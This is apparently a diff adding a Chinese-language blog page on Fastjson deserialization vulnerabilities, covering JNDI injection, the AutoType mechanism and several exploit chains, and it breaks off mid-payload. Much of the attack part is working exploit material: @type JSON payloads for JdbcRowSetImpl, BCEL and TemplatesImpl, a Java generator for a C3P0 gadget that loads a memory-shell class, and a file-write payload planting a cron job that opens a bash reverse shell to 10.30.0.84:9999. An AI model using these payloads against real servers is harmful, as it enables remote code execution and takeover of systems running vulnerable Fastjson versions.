@@ -1,0 +1,325 @@
+<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="noindex, nofollow"><title>Fastjson | 养猪日记</title>
+<meta name=keywords content><meta name=description content='一、FastJson介绍
+Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object 之间互相转换，不需要添加额外的依赖，能够直接跑在JDK上，FastJson采用独创的算法，将序列化的速度提升到极致，深受用户喜爱。产品主要提供两个接口 JSON.toJSONString 和 JSON.parseObject/JSON.parse 来分别实现序列化和反序列化操作。
+二、漏洞原理
+fastjson的漏洞涉及几个重要概念，深入理解一些概念后才能理解为什么会出现这种情况，以及一些面试官为什么会问一些奇怪的问题，比如fastjson不出网利用、如何判断版本等；
+2.1 JNDI注入的前置知识
+2.1.1 Java Bean
+一类满足标准写法的类，满足以下条件的Java类可以称之为Java Bean。
+1、成员变量均使用private关键字进行修饰
+2、提供构造方法(有参/无参)
+3、为每个成员变量提供set/get方法
+2.1.2 反射
+一种可以调用任意类任意方法的类；
+2.1.3 序列化和反序列化
+远程数据传输，不安全的反序列化可以造成RCE；
+2.1.4 JNDI
+Java名称与目录服务接口，可以理解为一个强大的通讯录，可以定位用户、网络、对象、机器等等资源
+
+
+在实战利用中，常见的服务为LDAP、DNS、RMI，具体的代码实现效果为，如果lookup可控就可以导致JNDI注入
+InitialContext context = new InitialContext();
+context.lookup("rmi://localhost:1099/HelloService");
+具体流程如下：
+1、目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控； 
+2、攻击者控制URI参数为恶意的RMI服务地址，如：rmi://hacker_rmi_server//name； 
+3、攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类； 
+4、目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例； 
+5、攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果；
+另外一种解释：
+JNDI支持将一个名称映射到一个Java对象,可以通过JNDI中的lookup函数向特定的提供命名服务的服务器发起查询请求获取具体对象。lookup函数可以向远程的提供目录服务的服务器发起请求查询指定对象，如果返回的是Reference类型的对象，JNDI会解析该对象的classFactory、classFactoryLocation属性。classFactory通常代表类名，classFaxtoryLocation通常代表其存储地址，JVM首先会尝试在本地寻找该类，如果本地不存在则会从classFactoryLocation(通常是一个http服务器的地址,位于远程)中进行加载，此时会触发 URLClassLoader类远程加载器，会从classFactoryLocation地址中获取远程的class文件并将其加载到JVM中。
+一些版本注入的问题：
+RMI攻击主要分3种目标：RMI Client、RMI Server、RMI Registry。
+使用远程Reference字节码进行攻击。（最初始的方式，没有任何拦截）
+从jdk8u121开始，RMI加入了反序列化白名单机制，JRMP的payload登上舞台，这里的
+payload指的是ysoserial修改后的JRMPClient。（黑名单拦截一些类的截断）
+从jdk8u121开始，RMI远程Reference代码默认不信任，RMI远程Reference代码攻击
+方式开始失效。（直接不信任rmi）
+从jdk8u191开始，LDAP远程Reference代码默认不信任，LDAP远程Reference代码攻
+击方式开始失效，需要通过javaSerializedData返回序列化gadget方式实现攻击。
+（直接不信任ldap，这以后基本都是基于本地的gadget去做复现了））
+RMI服务端执行bind，我们就可以攻击RMI Registry注册中心，导致其反序列化RCE。
+RMI客户端使用lookup方法理论上可以主动攻击RMI Registry
+RMI Registry在RMI客户端使用lookup方法的时候，可以实现被动攻击RMI客户端
+来看一下这个路程
+（1）先开始什么都没有处理，rmi开启的端口可以直接发送数据过去被反序列化
+（2）发现不对劲，所以java增加了黑名单机制（细节这里没讲），所以开始利用
+jrmp的payload（其实就是绕过了黑名单能发送数据的类）
+（3）后续rmi被不信任以后，研究人员发现了ldap也可以远程加载目录，ldap登上了
+舞台
+（4）ldap也被不信任，相当于无法远程加载，目前给的方法就是直接打过去让本
+地存在的链子命令执行，不需要像外部做加载。
+高版本注入的解决办法：'><meta name=author content="养猪日记"><link rel=canonical href=http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/fastjson/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/fastjson/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Home (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/ title=分类><span>分类</span></a></li><li><a href=http://localhost:1313/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Fastjson</h1><div class=post-meta><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;817 words&nbsp;·&nbsp;养猪日记</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#21-jndi注入的前置知识>2.1 JNDI注入的前置知识</a><ul><li><a href=#211-java-bean>2.1.1 Java Bean</a></li><li><a href=#212-反射>2.1.2 反射</a></li><li><a href=#213-序列化和反序列化>2.1.3 序列化和反序列化</a></li><li><a href=#214-jndi>2.1.4 JNDI</a></li><li><a href=#215-rmi>2.1.5 RMI</a></li></ul></li><li><a href=#22-fastjosn的原理>2.2 Fastjosn的原理</a><ul><li><a href=#221-fastjson中setter方法的作用>2.2.1 Fastjson中setter方法的作用</a></li><li><a href=#222-autotype机制>2.2.2 AutoType机制</a></li></ul></li><li><a href=#23-fastjson的利用链>2.3 Fastjson的利用链</a><ul><li><a href=#31-comsunrowsetjdbcrowsetimpl利用链>3.1 com.sun.rowset.JdbcRowSetImpl利用链</a></li><li><a href=#32-orgapachetomcatdbcpdbcp2basicdatasource链>3.2 org.apache.tomcat.dbcp.dbcp2.BasicDataSource链</a></li><li><a href=#323-comsunorgapachexalaninternalxsltctraxtemplatesimpl-链>3.2.3 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 链</a></li><li><a href=#324-inet4address-dns链>3.2.4 Inet4Address dns链</a></li><li><a href=#325-c3p0hexbase的链>3.2.5 C3P0 hexbase的链</a></li><li><a href=#326-commons-io写文件链>3.2.6 commons-io写文件链</a></li><li><a href=#327-groovy-链>3.2.7 Groovy 链</a></li></ul></li></ul><ul><li><a href=#1jndi注入内存马>1、JNDI注入内存马：</a></li><li><a href=#2c3p0-内存马注入>2、C3P0 内存马注入</a></li><li><a href=#3bcel注入>3、BCEL注入</a></li><li><a href=#4写文件charsetsjar注入>4、写文件charsets.jar注入</a></li><li><a href=#5classes>5、classes</a></li></ul></nav></div></details></div><div class=post-content><h1 id=一fastjson介绍>一、FastJson介绍<a hidden class=anchor aria-hidden=true href=#一fastjson介绍>#</a></h1><p>Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object 之间互相转换，不需要添加额外的依赖，能够直接跑在JDK上，FastJson采用独创的算法，将序列化的速度提升到极致，深受用户喜爱。产品主要提供两个接口 JSON.toJSONString 和 JSON.parseObject/JSON.parse 来分别实现序列化和反序列化操作。</p><h1 id=二漏洞原理>二、漏洞原理<a hidden class=anchor aria-hidden=true href=#二漏洞原理>#</a></h1><p>fastjson的漏洞涉及几个重要概念，深入理解一些概念后才能理解为什么会出现这种情况，以及一些面试官为什么会问一些奇怪的问题，比如fastjson不出网利用、如何判断版本等；</p><h2 id=21-jndi注入的前置知识>2.1 JNDI注入的前置知识<a hidden class=anchor aria-hidden=true href=#21-jndi注入的前置知识>#</a></h2><h3 id=211-java-bean>2.1.1 Java Bean<a hidden class=anchor aria-hidden=true href=#211-java-bean>#</a></h3><p>一类满足标准写法的类，满足以下条件的Java类可以称之为Java Bean。</p><p>1、成员变量均使用private关键字进行修饰</p><p>2、提供构造方法(有参/无参)</p><p>3、为每个成员变量提供set/get方法</p><h3 id=212-反射>2.1.2 反射<a hidden class=anchor aria-hidden=true href=#212-反射>#</a></h3><p>一种可以调用任意类任意方法的类；</p><h3 id=213-序列化和反序列化>2.1.3 序列化和反序列化<a hidden class=anchor aria-hidden=true href=#213-序列化和反序列化>#</a></h3><p>远程数据传输，不安全的反序列化可以造成RCE；</p><h3 id=214-jndi>2.1.4 JNDI<a hidden class=anchor aria-hidden=true href=#214-jndi>#</a></h3><p>Java名称与目录服务接口，可以理解为一个强大的通讯录，可以定位用户、网络、对象、机器等等资源</p><p><img loading=lazy src=/zj_img/WEBRESOURCE0cc7bd9389f51609d1ea7294c65b0e20image.png alt></p><p>在实战利用中，常见的服务为LDAP、DNS、RMI，具体的代码实现效果为，如果lookup可控就可以导致JNDI注入</p><pre tabindex=0><code>InitialContext context = new InitialContext();
+context.lookup(&#34;rmi://localhost:1099/HelloService&#34;);
+</code></pre><p>具体流程如下：</p><p>1、目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控； </p><p>2、攻击者控制URI参数为恶意的RMI服务地址，如：rmi://hacker_rmi_server//name； </p><p>3、攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类； </p><p>4、目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例； </p><p>5、攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果；</p><p>另外一种解释：</p><p>JNDI支持将一个名称映射到一个Java对象,可以通过JNDI中的lookup函数向特定的提供命名服务的服务器发起查询请求获取具体对象。lookup函数可以向远程的提供目录服务的服务器发起请求查询指定对象，如果返回的是Reference类型的对象，JNDI会解析该对象的classFactory、classFactoryLocation属性。classFactory通常代表类名，classFaxtoryLocation通常代表其存储地址，JVM首先会尝试在本地寻找该类，如果本地不存在则会从classFactoryLocation(通常是一个http服务器的地址,位于远程)中进行加载，此时会触发 URLClassLoader类远程加载器，会从classFactoryLocation地址中获取远程的class文件并将其加载到JVM中。</p><p><strong>一些版本注入的问题：</strong></p><pre tabindex=0><code>RMI攻击主要分3种目标：RMI Client、RMI Server、RMI Registry。
+使用远程Reference字节码进行攻击。（最初始的方式，没有任何拦截）
+从jdk8u121开始，RMI加入了反序列化白名单机制，JRMP的payload登上舞台，这里的
+payload指的是ysoserial修改后的JRMPClient。（黑名单拦截一些类的截断）
+从jdk8u121开始，RMI远程Reference代码默认不信任，RMI远程Reference代码攻击
+方式开始失效。（直接不信任rmi）
+从jdk8u191开始，LDAP远程Reference代码默认不信任，LDAP远程Reference代码攻
+击方式开始失效，需要通过javaSerializedData返回序列化gadget方式实现攻击。
+（直接不信任ldap，这以后基本都是基于本地的gadget去做复现了））
+RMI服务端执行bind，我们就可以攻击RMI Registry注册中心，导致其反序列化RCE。
+RMI客户端使用lookup方法理论上可以主动攻击RMI Registry
+RMI Registry在RMI客户端使用lookup方法的时候，可以实现被动攻击RMI客户端
+来看一下这个路程
+（1）先开始什么都没有处理，rmi开启的端口可以直接发送数据过去被反序列化
+（2）发现不对劲，所以java增加了黑名单机制（细节这里没讲），所以开始利用
+jrmp的payload（其实就是绕过了黑名单能发送数据的类）
+（3）后续rmi被不信任以后，研究人员发现了ldap也可以远程加载目录，ldap登上了
+舞台
+（4）ldap也被不信任，相当于无法远程加载，目前给的方法就是直接打过去让本
+地存在的链子命令执行，不需要像外部做加载。
+</code></pre><p><strong>高版本注入的解决办法：</strong></p><p>高版本JDK在RMI和LDAP的trustURLCodebase都做了限制，从默认允许远程加载ObjectFactory变成了不允许，绕过思路为：</p><p>1、找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。</p><p>2、利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。</p><pre tabindex=0><code>https://github.com/qi4L/JYso/
+</code></pre><p><strong>老版本JRE下载：</strong></p><pre tabindex=0><code>http://www.oracle.com/technetwork/java/archive-139210.html
+</code></pre><h3 id=215-rmi>2.1.5 RMI<a hidden class=anchor aria-hidden=true href=#215-rmi>#</a></h3><p>远程方法调用</p><p>任何可以被远程调用方法的对象必须实现序列化和远程接口，或者手工初始化远程对象，客户端本地必须有远程对象的接口，不然无法指定要调用的方法，而且其全限定名必须与服务器上的对象完全相同，从逻辑上可以简单的理解为调用远程对象，或者方法。</p><p>客户端通过调用stub来远程访问服务端的对象，其中的端口和地址等由Stub负责。</p><p><img loading=lazy src=/zj_img/WEBRESOURCEa46f9794d7ff8517d038f46640fdc90eimage.png alt></p><p>注册表机制，为了获取Stub用以正确调用远程对象而存在：</p><p>RMIRegistry也是一个远程对象，默认监听在1099端口上</p><p><img loading=lazy src=/zj_img/WEBRESOURCE756e47cd296588faf3b4f532a515600eimage.png alt></p><h4 id=动态加载类>动态加载类<a hidden class=anchor aria-hidden=true href=#动态加载类>#</a></h4><p>RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。对于客户端而言，服务端返回值也可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些子类中被重写的方法，则同样需要有运行时动态加载额外类的能力。客户端使用了与RMI注册表相同的机制。RMI服务端将URL传递给客户端，客户端通过HTTP请求下载这些类。 </p><h2 id=22-fastjosn的原理>2.2 Fastjosn的原理<a hidden class=anchor aria-hidden=true href=#22-fastjosn的原理>#</a></h2><p>有了前置知识后，我们大概可以明白jndi注入的原理，从实战的角度出发，那么需要几个条件：</p><p>1、lookup函数内容可控制；</p><p>2、目标主机可访问rmi或者ldap服务器；</p><h3 id=221-fastjson中setter方法的作用>2.2.1 Fastjson中setter方法的作用<a hidden class=anchor aria-hidden=true href=#221-fastjson中setter方法的作用>#</a></h3><p>在反序列化的过程中需要为创建的对象中的成员变量进行赋值,在赋值的过程中如果成员变量是私有的,就需要调用对应成员的setter方法为其进行赋值，并且这个过程是自动调用的.</p><p>举个例子，假如有个类叫做student:</p><pre tabindex=0><code>public class Student {
+    private String name;
+    private int age;
+
+    public void setName(String name){
+        this.name = name;
+    }
+    public void void setAge(int age){
+        this.age = age;
+    }
+    public String getName(){
+        return name;
+    }
+    public int getAge(){
+        return age;
+    }
+}
+</code></pre><p>在fastjosn中，正常设置该属性</p><pre tabindex=0><code>import com.alibaba.fastjson.JSON;
+
+public class Main {
+
+    public static void main(String[] args) {
+        String json = &#34;{\&#34;age\&#34;:20,\&#34;name\&#34;:\&#34;Liming\&#34;}&#34;;
+        Student xiaoming = JSON.parseObject(json,Student.class);
+    }
+}
+</code></pre><p>在这个例子中，设置对象的属性就是默认调用了对象的set方法，如果set方法中还有恶意命令，则可以造成命令执行。</p><h3 id=222-autotype机制>2.2.2 AutoType机制<a hidden class=anchor aria-hidden=true href=#222-autotype机制>#</a></h3><p>在上一步的反序列化中，我们需要指定传入的Student.class，也就是Class字节码对象，很显然，这样子并不方便进行利用，因为需要一个已经实例化了的class对象，所以有了该机制。</p><p> FastJson的AutoType机制支持在反序列化的过程中自动获取指定类的Class文件对象，当序列化的JSON字符串中包含@type键时就会自动将其值作为反序列化生成对象的具体类型，重点就在这里了，我们只需要传入类里面的数据就行了，不需要传输对象字节码。</p><p>FastJson自动获取对应的Class字节码对象，从而进行反射创建实例,为对象属性赋值等操作(和正常情况一样)，唯一的区别是不用直接传递class对象了，在JSON字符串中使用@type健即可自动获取类对应的Class对象。</p><p>所以有了这个序列化的对象：</p><pre tabindex=0><code>{&#34;@type&#34;:&#34;Student&#34;,&#34;age&#34;:20,&#34;name&#34;:&#34;xiaoming&#34;}
+</code></pre><p>大概意思就是，会自动生成一个Student对象，并调用set方法去设置age和name。</p><p>至此其实已经完成了fastjson的漏洞解析，接下来，无非就是利用哪条链的问题了，可以利用的链需要满足以下要求：</p><p>1、存在set、get方法；</p><p>2、set、get方法传参可控；</p><p>3、传参后相关链子可用达到RCE的作用；</p><p>4、最后是相关依赖最好比较普遍，以便于利用；</p><h2 id=23-fastjson的利用链>2.3 Fastjson的利用链<a hidden class=anchor aria-hidden=true href=#23-fastjson的利用链>#</a></h2><h3 id=31-comsunrowsetjdbcrowsetimpl利用链>3.1 com.sun.rowset.JdbcRowSetImpl利用链<a hidden class=anchor aria-hidden=true href=#31-comsunrowsetjdbcrowsetimpl利用链>#</a></h3><p>这条链子其实就是上面JNDI注入的讲解，大致情况如下：</p><p><img loading=lazy src=/zj_img/WEBRESOURCEa5d018b0d290385f5855eaf558449178e23a8130bdd952623bb2e4a004e4f14c.jpg alt></p><p>该链的POC大概这样：</p><pre tabindex=0><code>{&#34;@type&#34;:&#34;com.sun.rowset.JdbcRowSetImpl&#34;,&#34;dataSourceName&#34;:&#34;ldap/rmi Server&#34;, &#34;autoCommit&#34;:true}
+</code></pre><p>代码分析：</p><p>JdbcRowSetImpl的dataSourceName方法，该方法其实就是一个简单的赋值，核心其实就一句super.setDataSourceName(dsName): 调用父类的方法来设置数据源。</p><p><img loading=lazy src=/zj_img/WEBRESOURCEf269c4dcf0a0b7f4880d6043e110ef93image.png alt></p><p>然后是autoCommit方法，这里其实是设置是否自动提交的方法，调用conn方法去连接：</p><p><img loading=lazy src=/zj_img/WEBRESOURCEa3c4743c9517e0a4acd7a7db02e3d443image.png alt></p><p>conn方法，大概内容是判断连接是否存在，如果DataSourceName不为空，就通过jndi去查找数据源，这里有lookuo函数，就走到了jndi注入的地方：</p><p><img loading=lazy src=/zj_img/WEBRESOURCEe7d732cb3e0c109be344e5653a23e9f9image.png alt></p><h3 id=32-orgapachetomcatdbcpdbcp2basicdatasource链>3.2 org.apache.tomcat.dbcp.dbcp2.BasicDataSource链<a hidden class=anchor aria-hidden=true href=#32-orgapachetomcatdbcpdbcp2basicdatasource链>#</a></h3><p>此利用链只能应用于</p><h4 id=321-bcel>3.2.1 BCEL<a hidden class=anchor aria-hidden=true href=#321-bcel>#</a></h4><p>BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，BCEL库提供了一系列用于分析、创建、修改Java Class文件的API。就这个库的功能来看，其使用面远不及同胞兄弟们，但是他比Commons Collections特殊的一点是，它被包含在了原生的JDK中，位于com.sun.org.apache.bcel，但是注意的是在JDK- 8u251之后的BCEL中没有类加载器。</p><p>BCEL这个包中有个类com.sun.org.apache.bcel.internal.util.ClassLoader，他是一个ClassLoader，但是他重写了Java内置的ClassLoader#loadClass()方法。 在ClassLoader#loadClass()中，其会判断类名是否是$$BCEL$$开头，如果是的话，将会对这个字符串进行decode。可以理解为是传统字节码的HEX编码，再将反斜线替换成$。默认情况下外层还会加一层GZip压缩。</p><h4 id=322-orgapachetomcatdbcpdbcp2basicdatasource>3.2.2 org.apache.tomcat.dbcp.dbcp2.BasicDataSource<a hidden class=anchor aria-hidden=true href=#322-orgapachetomcatdbcpdbcp2basicdatasource>#</a></h4><p>这条链子不在jdk中，使用tomcat的时候可以尝试，值得注意的是不同版本的tomcat-dbcp最后对应的payload有所不同：</p><p>Tomcat7 org.apache.tomcat.dbcp.dbcp.BasicDataSource</p><p>Tomcat8及以后 org.apache.tomcat.dbcp.dbcp2.BasicDataSource</p><p>payload：</p><pre tabindex=0><code>{
+    {
+        &#34;x&#34;:{
+                &#34;@type&#34;: &#34;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&#34;,
+                &#34;driverClassLoader&#34;: {
+                    &#34;@type&#34;: &#34;com.sun.org.apache.bcel.internal.util.ClassLoader&#34;
+                },
+                &#34;driverClassName&#34;: &#34;$$BCEL$$$l$8b$I$A$...&#34;
+        }
+    }: &#34;x&#34;
+}
+</code></pre><p>链子解析，在BasicDataSource中存在这方法，</p><p>简单来说，这串代码可以让我们指定加载的对象和加载器，而driverClassName和driverClassLoader都是有set方法可以指定的。</p><p>其实到这里，payload已经比较好认识了，首先是指定，</p><p><img loading=lazy src=/zj_img/WEBRESOURCEb0a96f2d106731235f825f4c80e37ec0image.png alt></p><p>当然在到达createConnectionFactory方法之前，他是被其他方法调用的，链子为getConnection()->createDataSource()->createConnectionFactory()，当调用toString的时候，会依次调用该类的getter方法获取值。然后会以字符串的形式输出出来。所以会调用到getConnection方法.</p><p>但是要触发getter方法，需要让JSONObject位于JSON的key上，所以会出现两个X包裹的情况，当使用JSON.parseObject(poc);等方法反序列化中会出现。</p><h3 id=323-comsunorgapachexalaninternalxsltctraxtemplatesimpl-链>3.2.3 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 链<a hidden class=anchor aria-hidden=true href=#323-comsunorgapachexalaninternalxsltctraxtemplatesimpl-链>#</a></h3><p>大致方法大差不差，也可以作为不出网的方法，但是条件非常苛刻，jdk版本、反序列化的格式等，都会导致漏洞无法利用；</p><pre tabindex=0><code>{&#34;@type&#34;:&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;,&#34;_bytecodes&#34;:[&#34;base64&#34;],&#34;_name&#34;:&#34;a.b&#34;,&#34;_tfactory&#34;:{ },&#34;_outputProperties&#34;:{ },&#34;_version&#34;:&#34;1.0&#34;,&#34;allowedProtocols&#34;:&#34;all&#34;}
+</code></pre><h3 id=324-inet4address-dns链>3.2.4 Inet4Address dns链<a hidden class=anchor aria-hidden=true href=#324-inet4address-dns链>#</a></h3><pre tabindex=0><code>{&#34;b&#34;:{&#34;@type&#34;:&#34;java.net.Inet4Address&#34;,&#34;val&#34;:&#34;ailx10.iye2ck.dnslog.cn&#34;}}
+</code></pre><h3 id=325-c3p0hexbase的链>3.2.5 C3P0 hexbase的链<a hidden class=anchor aria-hidden=true href=#325-c3p0hexbase的链>#</a></h3><p>poc代码如下，使用IDEA加载class文件即可，可用于不出网的情况，该链子还有JNDI和远程类加载</p><pre tabindex=0><code>import com.alibaba.fastjson.JSONArray;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import javax.management.BadAttributeValueExpException;
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Base64;
+import java.util.HashMap;
+
+public class Test {
+    public static void main(String[] args) throws Exception {
+        String hex2 = bytesToHex(tobyteArray(gen()));
+        String FJ1247 = &#34;{\n&#34; +
+                &#34;    \&#34;a\&#34;:{\n&#34; +
+                &#34;        \&#34;@type\&#34;:\&#34;java.lang.Class\&#34;,\n&#34; +
+                &#34;        \&#34;val\&#34;:\&#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&#34;\n&#34; +
+                &#34;    },\n&#34; +
+                &#34;    \&#34;b\&#34;:{\n&#34; +
+                &#34;        \&#34;@type\&#34;:\&#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&#34;,\n&#34; +
+                &#34;        \&#34;userOverridesAsString\&#34;:\&#34;HexAsciiSerializedMap:&#34; + hex2 + &#34;;\&#34;,\n&#34; +
+                &#34;    }\n&#34; +
+                &#34;}\n&#34;;
+        System.out.println(FJ1247);
+    }
+    //FastJson原生反序列化加载恶意类字节码
+    public static Object gen() throws Exception {
+        TemplatesImpl templates = TemplatesImpl.class.newInstance();
+        byte[] bytes = Files.readAllBytes(Paths.get(&#34;e:\\FRain.class&#34;)); //刚才做好的内存马我是放在e盘下，读取其中字节即可
+        setValue(templates, &#34;_bytecodes&#34;, new byte[][]{bytes});
+        setValue(templates, &#34;_name&#34;, &#34;1&#34;);
+        setValue(templates, &#34;_tfactory&#34;, null);
+
+        JSONArray jsonArray = new JSONArray();
+        jsonArray.add(templates);
+
+        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);
+        setValue(bd,&#34;val&#34;,jsonArray);
+
+        HashMap hashMap = new HashMap();
+        hashMap.put(templates,bd);
+        return hashMap;
+    }
+    public static void setValue(Object obj, String name, Object value) throws Exception{
+        Field field = obj.getClass().getDeclaredField(name);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+
+    //将类序列化为字节数组
+    public static byte[] tobyteArray(Object o) throws IOException {
+        ByteArrayOutputStream bao = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(bao);
+        oos.writeObject(o);   //
+        return bao.toByteArray();
+    }
+
+    //字节数组转十六进制
+    public static String bytesToHex(byte[] bytes) {
+        StringBuffer stringBuffer = new StringBuffer();
+        for (int i = 0; i &lt; bytes.length; i++) {
+            String hex = Integer.toHexString(bytes[i] &amp; 0xff);      //bytes[]中为带符号字节-255~+255，&amp;0xff: 保证得到的数据在0~255之间
+            if (hex.length()&lt;2){
+                stringBuffer.append(&#34;0&#34; + hex);   //0-9 则在前面加‘0’,保证2位避免后面读取错误
+            }else {
+                stringBuffer.append(hex);
+            }
+        }
+        return stringBuffer.toString();
+    }
+}
+</code></pre><h3 id=326-commons-io写文件链>3.2.6 commons-io写文件链<a hidden class=anchor aria-hidden=true href=#326-commons-io写文件链>#</a></h3><p>写文件利用链，常用于1.2.68及以上</p><p>计划任务的POC：</p><pre tabindex=0><code>public static void main(String[] args) throws Exception {
+    	String code = gzcompress(&#34;* * * * *  bash -i &gt;&amp; /dev/tcp/10.30.0.84/9999 0&gt;&amp;1 \n&#34;);
+    	//&lt;=1.2.68 and JDK11
+        String payload = &#34;{\r\n&#34;
+        		+ &#34;    \&#34;@type\&#34;:\&#34;java.lang.AutoCloseable\&#34;,\r\n&#34;
+        		+ &#34;    \&#34;@type\&#34;:\&#34;sun.rmi.server.MarshalOutputStream\&#34;,\r\n&#34;
+        		+ &#34;    \&#34;out\&#34;:\r\n&#34;
+        		+ &#34;    {\r\n&#34;
+        		+ &#34;        \&#34;@type\&#34;:\&#34;java.util.zip.InflaterOutputStream\&#34;,\r\n&#34;
+        		+ &#34;        \&#34;out\&#34;:\r\n&#34;
+        		+ &#34;        {\r\n&#34;
+        		+ &#34;           \&#34;@type\&#34;:\&#34;java.io.FileOutputStream\&#34;,\r\n&#34;
+        		+ &#34;           \&#34;file\&#34;:\&#34;/var/spool/cron/root\&#34;,\r\n&#34;
+        		+ &#34;           \&#34;append\&#34;:false\r\n&#34;
+        		+ &#34;        },\r\n&#34;
+        		+ &#34;        \&#34;infl\&#34;:\r\n&#34;
+        		+ &#34;        {\r\n&#34;
+        		+ &#34;            \&#34;input\&#34;:\r\n&#34;
+        		+ &#34;            {\r\n&#34;
